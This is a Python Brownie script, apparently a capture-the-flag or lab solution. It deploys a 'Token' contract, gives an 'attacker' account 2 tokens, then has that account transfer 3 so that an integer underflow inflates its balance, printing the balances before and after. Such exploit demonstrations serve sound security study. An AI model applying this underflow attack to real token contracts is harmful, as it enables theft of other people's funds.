from brownie import network, Token
from scripts.helpful import get_account, LOCAL_NETWORKS


def deploy(account):
    publish = False
    if network.show_active() not in LOCAL_NETWORKS:
        publish = True
    contract = Token.deploy(22, {"from": account}, publish_source=publish)
    print(
        f"Cotntract --Token-- deployed at {contract.address} from {account.address}\n"
    )
    return contract


def main():
    owner_account = get_account(0)
    attacker_account = get_account(1)
    contract = deploy(owner_account)
    print(f"Owner tokens: {contract.balanceOf(owner_account)}\n")
    print(f"Send 2 tokens to attacker: {attacker_account.address}\n")
    contract.transfer(attacker_account.address, 2, {"from": owner_account})
    print(f"Owner tokens: {contract.balanceOf(owner_account)}\n")
    print(f"Attacker tokens: {contract.balanceOf(attacker_account)}\n")
    print("<<<<<<<<<<<<ATTACKING>>>>>>>>>>>>>>")
    print(
        f"Send 3 tokens to owner from attacker. Attacker tokens: {attacker_account.balance()}"
    )
    contract.transfer(owner_account.address, 3, {"from": attacker_account})
    print("<<<<<<<<<<<< AFTER ATTACK >>>>>>>>>>>>>>")
    print(f"Owner balance: {contract.balanceOf(owner_account)}\n")
    print(f"Attacker balance: {contract.balanceOf(attacker_account)}\n")


if __name__ == "__main__":
    main()
